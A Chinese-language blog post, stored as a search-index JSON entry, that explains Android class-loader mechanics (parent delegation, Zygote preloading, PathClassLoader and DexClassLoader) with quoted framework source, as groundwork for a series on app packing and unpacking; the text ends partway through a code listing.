[{"title":"Android加壳与脱壳（1）——深入理解类加载器和动态加载","url":"/2022/12/03/Packer1/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>最近一直在学习Android 加壳和脱壳，在进行Android加壳和脱壳的学习中，第一步便是深入理解类加载器和动态加载二者之间的关系，本文详细的介绍了类加载器和动态加载之间的关系和原理，之所以详细的讲解两者之间的关系，一是学习脱壳和加壳的需要，二是为后面Android插件化漏洞挖掘的讲解做铺垫。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"二、类加载器\"><a href=\"#二、类加载器\" class=\"headerlink\" title=\"二、类加载器\"></a>二、类加载器</h2><p>Android中的类加载器机制与JVM一样遵循双亲委派模式</p>\n<h3 id=\"1-双亲委派模式\"><a href=\"#1-双亲委派模式\" class=\"headerlink\" title=\"1.双亲委派模式\"></a>1.双亲委派模式</h3><h4 id=\"（1）双亲委派模式定义\"><a href=\"#（1）双亲委派模式定义\" class=\"headerlink\" title=\"（1）双亲委派模式定义\"></a>（1）双亲委派模式定义</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）加载.class文件时，以递归的形式逐级向上委托给父加载器ParentClassLoader加载，如果加载过了，就不用再加载一遍</span><br><span class=\"line\">（<span class=\"number\">2</span>）如果父加载器没有加载过，继续委托给父加载器去加载，一直到这条链路的顶级，顶级ClassLoader如果没有加载过，则尝试加载，加载失败，则逐级向下交还调用者加载</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/1.png\" alt=\"image-20211009111527762\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> Class&lt;?&gt; loadClass(String name, <span class=\"type\">boolean</span> resolve) <span class=\"keyword\">throws</span> ClassNotFoundException&#123;</span><br><span class=\"line\">           <span class=\"comment\">//1.先检查是否已经加载过--findLoaded</span></span><br><span class=\"line\">           Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class=\"line\">           <span class=\"keyword\">if</span> (c == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">               <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                   <span class=\"comment\">//2.如果自己没加载过,存在父类,则委托父类</span></span><br><span class=\"line\">                   <span class=\"keyword\">if</span> (parent != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                       c = parent.loadClass(name, <span class=\"literal\">false</span>);</span><br><span class=\"line\">                   &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                       c = findBootstrapClassOrNull(name);</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">               &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException e) &#123;</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">               <span class=\"keyword\">if</span> (c == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                   <span class=\"comment\">//3.如果父类也没加载过,则尝试本级classLoader加载</span></span><br><span class=\"line\">                   c = findClass(name);</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">代码解释：</span><br><span class=\"line\">（1）先检查自己是否已经加载过class文件，用findLoadedClass方法，如果已经加载了直接返回</span><br><span class=\"line\">（2）如果自己没有加载过，存在父类，则委派父类去加载，用parent.loadClass(name,false)方法，此时会向上传递，然后去父加载器中循环第1步，一直到顶级ClassLoader</span><br><span class=\"line\">(3) 如果父类没有加载，则尝试本级classLoader加载，如果加载失败了就会向下传递，交给调用方式实现.class文件的加载</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）双亲委派模式加载流程\"><a href=\"#（2）双亲委派模式加载流程\" class=\"headerlink\" title=\"（2）双亲委派模式加载流程\"></a>（2）双亲委派模式加载流程</h4><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/2.png\" alt=\"image-20211009111527762\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">我们要加载一个class文件，我们定义了一个CustomerClassLoader类加载器:</span><br><span class=\"line\">(<span class=\"number\">1</span>)首先会判断自己的CustomerClassLoader否加载过,如果加载过直接返回,</span><br><span class=\"line\">(<span class=\"number\">2</span>)如果没有加载过则会调用父类PathClassLoader去加载,该父类同样会判断自己是否加载过,如果没有加载过则委托给父类BootClassLoader去加载,</span><br><span class=\"line\">(<span class=\"number\">3</span>)这个BootClassLoader是顶级classLoader,同样会去判断自己有没有加载过,如果也没有加载过则会调用自己的findClass(name)去加载,</span><br><span class=\"line\">(<span class=\"number\">4</span>)如果顶级BootClassLoader加载失败了,则会把加载这个动作向下交还给PathClassLoader,</span><br><span class=\"line\">(<span class=\"number\">5</span>)这个PathClassLoader也会尝试去调用findClass(name);去加载,如果加载失败了,则会继续向下交还给CustomClassLoader来完成加载,这整个过程感觉是一个递归的过程,逐渐往上然后有逐渐往下,直到加载成功</span><br><span class=\"line\">其实这个String.class在系统启动的时候已经被加载了,我们自己定义一个CustomerClassLoader去加载,其实也是父类加载的</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）双亲委派的作用\"><a href=\"#（3）双亲委派的作用\" class=\"headerlink\" title=\"（3）双亲委派的作用\"></a>（3）双亲委派的作用</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(1) 防止同一个.class文件重复加载</span><br><span class=\"line\">(2) 对于任意一个类确保在虚拟机中的唯一性.由加载它的类加载器和这个类的全类名一同确立其在Java虚拟机中的唯一性</span><br><span class=\"line\">(3) 保证.class文件不被篡改，通过委派方式可以保证系统类的加载逻辑不被篡改</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Android中类加载机制\"><a href=\"#2-Android中类加载机制\" class=\"headerlink\" title=\"2. Android中类加载机制\"></a>2. Android中类加载机制</h3><h4 id=\"（1）Android基本类预加载\"><a href=\"#（1）Android基本类预加载\" class=\"headerlink\" title=\"（1）Android基本类预加载\"></a>（1）Android基本类预加载</h4><p>我们了解Android基本类预加载，首先我们回顾上文的Dalvik虚拟机启动相关：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/9.png\" alt=\"image-20211010143220857\"></p>\n<p>我们执行app_process程序，进入main函数里面，然后进行<code>AndroidRuntime::start</code>:</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/8.png\" alt=\"image-20211010143128565\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Zygote <span class=\"keyword\">native</span> 进程主要工作：</span><br><span class=\"line\">（<span class=\"number\">1</span>）创建虚拟机–startVM</span><br><span class=\"line\">（<span class=\"number\">2</span>）注册JNI函数–startReg</span><br><span class=\"line\">（<span class=\"number\">3</span>）通过JNI知道Java层的com.android.internal.os.ZygoteInit 类，调用main 函数，进入java 世界</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/10.png\" alt=\"image-20211010143826461\"></p>\n<p>然后进入Java层：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/11.png\" alt=\"image-20211010144010024\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Zygote总结：</span><br><span class=\"line\">（<span class=\"number\">1</span>）解析init.zygote.rc中的参数，创建AppRuntime并调用AppRuntime.start()方法</span><br><span class=\"line\">（<span class=\"number\">2</span>）调用AndroidRuntime的startVM()方法创建虚拟机，再调用startReg()注册JNI函数</span><br><span class=\"line\">（<span class=\"number\">3</span>）通过JNI方式调用ZygoteInit.main()，第一次进入Java世界</span><br><span class=\"line\">（<span class=\"number\">4</span>）registerZygoteSocket()建立socket通道，zygote作为通信的服务端，用于响应客户端请求</span><br><span class=\"line\">（<span class=\"number\">5</span>）preload()预加载通用类、drawable和color资源、openGL以及共享库以及WebView，用于提高app启动效率</span><br><span class=\"line\">（<span class=\"number\">6</span>）通过startSystemServer()，fork得力帮手system_server进程，也是Java Framework的运行载体（下面讲到system server再详细讲解）</span><br><span class=\"line\">（<span class=\"number\">7</span>）调用runSelectLoop()，随时待命，当接收到请求创建新进程请求时立即唤醒并执行相应工作</span><br></pre></td></tr></table></figure>\n\n<p>Android的类加载机制和JVM一样遵循双亲委派模式，在dalvik&#x2F;art启动时将所有Java基本类和Android系统框架的基本类加载进来，预加载的类记录在<code>/frameworks/base/config/preloaded-classes </code>中</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">android.R$styleable</span><br><span class=\"line\">android.accessibilityservice.AccessibilityServiceInfo$<span class=\"number\">1</span></span><br><span class=\"line\">android.accessibilityservice.AccessibilityServiceInfo</span><br><span class=\"line\">android.accessibilityservice.IAccessibilityServiceClient$Stub$Proxy</span><br><span class=\"line\">android.accessibilityservice.IAccessibilityServiceClient$Stub</span><br><span class=\"line\">android.accessibilityservice.IAccessibilityServiceClient</span><br><span class=\"line\">android.accounts.AbstractAccountAuthenticator$Transport</span><br><span class=\"line\">android.accounts.AbstractAccountAuthenticator</span><br><span class=\"line\">android.accounts.Account$<span class=\"number\">1</span></span><br><span class=\"line\">android.accounts.Account</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">java.lang.Short</span><br><span class=\"line\">java.lang.StackOverflowError</span><br><span class=\"line\">java.lang.StackTraceElement</span><br><span class=\"line\">java.lang.StrictMath</span><br><span class=\"line\">java.lang.String$<span class=\"number\">1</span></span><br><span class=\"line\">java.lang.String$CaseInsensitiveComparator</span><br><span class=\"line\">java.lang.String</span><br><span class=\"line\">java.lang.StringBuffer</span><br><span class=\"line\">java.lang.StringBuilder</span><br><span class=\"line\">java.lang.StringFactory</span><br><span class=\"line\">java.lang.StringIndexOutOfBoundsException</span><br><span class=\"line\">java.lang.System$PropertiesWithNonOverrideableDefaults</span><br><span class=\"line\">java.lang.System</span><br><span class=\"line\">java.lang.Thread$<span class=\"number\">1</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>这些类只需要在Zygote进程启动时加载一遍就可以了，后续没一个APP或Android运行时环境的进程，都是从Zygote中fork出来，天然保留了加载过的类缓存</p>\n<p><strong>ZygoteInit.preload()</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">preload</span><span class=\"params\">(TimingsTraceLog bootTimingsTraceLog)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...省略</span></span><br><span class=\"line\">    preloadClasses();</span><br><span class=\"line\">    <span class=\"comment\">// ...省略</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">preloadClasses</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">VMRuntime</span> <span class=\"variable\">runtime</span> <span class=\"operator\">=</span> VMRuntime.getRuntime();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 读取 preloaded_classes 文件</span></span><br><span class=\"line\">    InputStream is;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        is = <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(PRELOADED_CLASSES);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (FileNotFoundException e) &#123;</span><br><span class=\"line\">        Log.e(TAG, <span class=\"string\">&quot;Couldn&#x27;t find &quot;</span> + PRELOADED_CLASSES + <span class=\"string\">&quot;.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ...省略</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">BufferedReader</span> <span class=\"variable\">br</span> <span class=\"operator\">=</span></span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">BufferedReader</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">InputStreamReader</span>(is), Zygote.SOCKET_BUFFER_SIZE);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">count</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        String line;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> ((line = br.readLine()) != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Skip comments and blank lines.</span></span><br><span class=\"line\">            line = line.trim();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (line.startsWith(<span class=\"string\">&quot;#&quot;</span>) || line.equals(<span class=\"string\">&quot;&quot;</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            Trace.traceBegin(Trace.TRACE_TAG_DALVIK, line);</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 逐行加载基本类</span></span><br><span class=\"line\">                Class.forName(line, <span class=\"literal\">true</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">                count++;</span><br><span class=\"line\">                <span class=\"comment\">// ...省略</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Throwable t) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// ...省略</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// ...省略</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">        Log.e(TAG, <span class=\"string\">&quot;Error reading &quot;</span> + PRELOADED_CLASSES + <span class=\"string\">&quot;.&quot;</span>, e);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...省略</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/12.png\" alt=\"image-20211010144346830\"></p>\n<h4 id=\"（2）Android类加载器层级关系及分析\"><a href=\"#（2）Android类加载器层级关系及分析\" class=\"headerlink\" title=\"（2）Android类加载器层级关系及分析\"></a>（2）Android类加载器层级关系及分析</h4><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/3.png\" alt=\"image-20211010145342789\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/14.png\" alt=\"image-20211010145342789\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android中的ClassLoader类型分为系统ClassLoader和自定义ClassLoader。其中系统ClassLoader包括<span class=\"number\">3</span>种是BootClassLoader、DexClassLoader、PathClassLoader</span><br><span class=\"line\">(<span class=\"number\">1</span>)BootClassLoader:Android平台上所有Android系统启动时会使用BootClassLoader来预加载常用的类</span><br><span class=\"line\">(<span class=\"number\">2</span>)BaseDexClassLoader:实际应用层类文件的加载，而真正的加载委托给pathList来完成</span><br><span class=\"line\">(<span class=\"number\">3</span>)DexClassLoader:可以加载dex文件以及包含dex的压缩文件(apk,dex,jar,zip),可以安装一个未安装的apk文件，一般为自定义类加载器</span><br><span class=\"line\">(<span class=\"number\">4</span>)PathClassLoader:可以加载系统类和应用程序的类，通常用来加载已安装的apk的dex文件</span><br><span class=\"line\"></span><br><span class=\"line\">补充：</span><br><span class=\"line\">Android 提供的原生加载器叫做基础类加载器，包括：BootClassLoader，PathClassLoader，DexClassLoader，InMemoryDexClassLoader（Android <span class=\"number\">8.0</span> 引入），DelegateLastClassLoader（Android <span class=\"number\">8.1</span> 引入）</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-1-gt-BootClassLoader\"><a href=\"#lt-1-gt-BootClassLoader\" class=\"headerlink\" title=\"&lt;1&gt; BootClassLoader\"></a>&lt;1&gt; BootClassLoader</h5><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">启动类加载器，用于加载 Zygote 进程已经预加载的基本类，可以推测它只需从缓存中加载。这是基类 ClassLoader 的一个内部类，是包访问权限，所以应用程序无权直接访问</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ClassLoader</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...省略</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">BootClassLoader</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ClassLoader</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> BootClassLoader instance;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">synchronized</span> BootClassLoader <span class=\"title function_\">getInstance</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (instance == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                instance = <span class=\"keyword\">new</span> <span class=\"title class_\">BootClassLoader</span>();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> instance;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"title function_\">BootClassLoader</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">super</span>(<span class=\"literal\">null</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">protected</span> Class&lt;?&gt; findClass(String name) <span class=\"keyword\">throws</span> ClassNotFoundException &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Class.classForName(name, <span class=\"literal\">false</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// ...省略</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">protected</span> Class&lt;?&gt; loadClass(String className, <span class=\"type\">boolean</span> resolve)</span><br><span class=\"line\">               <span class=\"keyword\">throws</span> ClassNotFoundException &#123;</span><br><span class=\"line\">            Class&lt;?&gt; clazz = findLoadedClass(className);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (clazz == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                clazz = findClass(className);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// ...省略</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">源码分析：</span><br><span class=\"line\">\t我们可以看见，BootClassLoader没有父加载器，在缓存取不到类是直接调用自己的findClass()方法</span><br><span class=\"line\">\tfindClass()方法调用Class.classForName()方法，而ZygoteInit.preloadClasses()中，加载基本类是Class.forName()</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ublic <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Class</span>&lt;T&gt; <span class=\"keyword\">implements</span> <span class=\"title class_\">java</span>.io.Serializable,</span><br><span class=\"line\">                              GenericDeclaration,</span><br><span class=\"line\">                              Type,</span><br><span class=\"line\">                              AnnotatedElement &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...省略</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Class&lt;?&gt; forName(String className)</span><br><span class=\"line\">                <span class=\"keyword\">throws</span> ClassNotFoundException &#123;</span><br><span class=\"line\">        Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> forName(className, <span class=\"literal\">true</span>, ClassLoader.getClassLoader(caller));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Class&lt;?&gt; forName(String name, <span class=\"type\">boolean</span> initialize,</span><br><span class=\"line\">                                   ClassLoader loader)</span><br><span class=\"line\">        <span class=\"keyword\">throws</span> ClassNotFoundException</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (loader == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            loader = BootClassLoader.getInstance();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Class&lt;?&gt; result;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            result = classForName(name, initialize, loader);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            <span class=\"type\">Throwable</span> <span class=\"variable\">cause</span> <span class=\"operator\">=</span> e.getCause();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (cause <span class=\"keyword\">instanceof</span> LinkageError) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> (LinkageError) cause;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> e;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 本地方法</span></span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">native</span> Class&lt;?&gt; classForName(String className, <span class=\"type\">boolean</span> shouldInitialize,</span><br><span class=\"line\">            ClassLoader classLoader) <span class=\"keyword\">throws</span> ClassNotFoundException;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ...省略</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">我们可以发现，预加载时，ZygoteInit.preloadClasses()中调用Class.forName()，实际是指定BootClassLoader为类加载器，且只需要在预加载的时候进行类初始化，只需要一次</span><br><span class=\"line\">总之，通过 Class.forName() 或者 Class.classForName() 可以且仅可以直接加载基本类，一旦基本类预加载后，对于应用程序而言，我们虽然不能直接访问BootClassLoader，但可以通过Class.forName/Class.classForName加载</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/4.png\" alt=\"image-20211009151836322\"></p>\n<p>无论是系统类加载器（PathClassLoader）还是自定义的类加载器（DexClassLoader），最顶层的祖先加载器默认是 BootClassLoader，与 JVM 一样，保证了基本类的类型安全</p>\n<p><strong>Class文件加载：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.通过Class.forName()方法动态加载</span><br><span class=\"line\">2.通过ClassLoader.loadClass()方法动态加载</span><br><span class=\"line\">类的加载分为3个步骤:1.装载(Load),2.链接(Link),3.初始化(Intialize)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/13.png\" alt=\"image-20211010144934269\"></p>\n<p>类加载时机：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.隐式加载:</span><br><span class=\"line\">(1)创建类的实例,也就是new一个对象</span><br><span class=\"line\">(2)访问某个类或接口的静态变量,或者对该静态变量赋值</span><br><span class=\"line\">(3)调用类的静态方法</span><br><span class=\"line\">(4)反射Class.forName(&quot;android.app.ActivityThread&quot;)</span><br><span class=\"line\">(5)初始化一个类的子类(会首先初始化子类的父类)</span><br><span class=\"line\">2.显示加载：</span><br><span class=\"line\">(1)使用LoadClass()加载</span><br><span class=\"line\">(2)使用forName()加载</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Class.forName 和 ClassLoader.loadClass加载有何不同：</span><br><span class=\"line\">（1）ClassLoader.loadClass也能加载一个类,但是不会触发类的初始化(也就是说不会对类的静态变量,静态代码块进行初始化操作)</span><br><span class=\"line\">（2）Class.forName这种方式,不但会加载一个类,还会触发类的初始化阶段,也能够为这个类的静态变量,静态代码块进行初始化操作</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-PathClassLoader\"><a href=\"#lt-2-gt-PathClassLoader\" class=\"headerlink\" title=\"&lt;2&gt; PathClassLoader\"></a>&lt;2&gt; PathClassLoader</h5><p>主要用于系统和app的类加载器,其中optimizedDirectory为null, 采用默认目录&#x2F;data&#x2F;dalvik-cache&#x2F;</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">PathClassLoader 是作为应用程序的系统类加载器，也是在 Zygote 进程启动的时候初始化的（基本流程为：ZygoteInit.main() -&gt; ZygoteInit.forkSystemServer() -&gt; ZygoteInit.handleSystemServerProcess() -&gt; ZygoteInit.createPathClassLoader()。在预加载基本类之后执行），所以每一个 APP 进程从 Zygote 中 fork 出来之后都自动携带了一个 PathClassLoader，它通常用于加载 apk 里面的 .dex 文件</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PathClassLoader</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">BaseDexClassLoader</span> &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">PathClassLoader</span><span class=\"params\">(String dexPath, ClassLoader parent)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(dexPath, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>, parent);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">PathClassLoader</span><span class=\"params\">(String dexPath, String librarySearchPath, ClassLoader parent)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(dexPath, <span class=\"literal\">null</span>, librarySearchPath, parent);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-3-gt-DexClassLoader\"><a href=\"#lt-3-gt-DexClassLoader\" class=\"headerlink\" title=\"&lt;3&gt; DexClassLoader\"></a>&lt;3&gt; DexClassLoader</h5><p> 可以从包含classes.dex的jar或者apk中，加载类的类加载器, 可用于执行动态加载, 但必须是app私有可写目录来缓存odex文件. 能够加载系统没有安装的apk或者jar文件， 因此很多热修复和插件化方案都是采用DexClassLoader</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> </span><br><span class=\"line\"><span class=\"title class_\">DexClassLoader</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">BaseDexClassLoader</span> &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">   <span class=\"keyword\">public</span> <span class=\"title function_\">DexClassLoader</span><span class=\"params\">(String dexPath, String optimizedDirectory,</span></span><br><span class=\"line\"><span class=\"params\">            String librarySearchPath, ClassLoader parent)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(dexPath, <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(optimizedDirectory), librarySearchPath, parent);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">总结：</span><br><span class=\"line\">\t我们可以发现DexClassLoader与PathClassLoader都继承于BaseDexClassLoader，这两个类只是提供了自己的构造函数，没有额外的实现</span><br><span class=\"line\">区别：</span><br><span class=\"line\">\tDexClassLoader提供了optimizedDirectory，而PathClassLoader则没有，optimizedDirectory正是用来存放odex文件的地方，所以可以利用DexClassLoader实现动态加载</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-4-gt-BaseDexClassLoader\"><a href=\"#lt-4-gt-BaseDexClassLoader\" class=\"headerlink\" title=\"&lt;4&gt; BaseDexClassLoader\"></a>&lt;4&gt; BaseDexClassLoader</h5><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BaseDexClassLoader</span> <span class=\"keyword\">extends</span> <span class=\"title 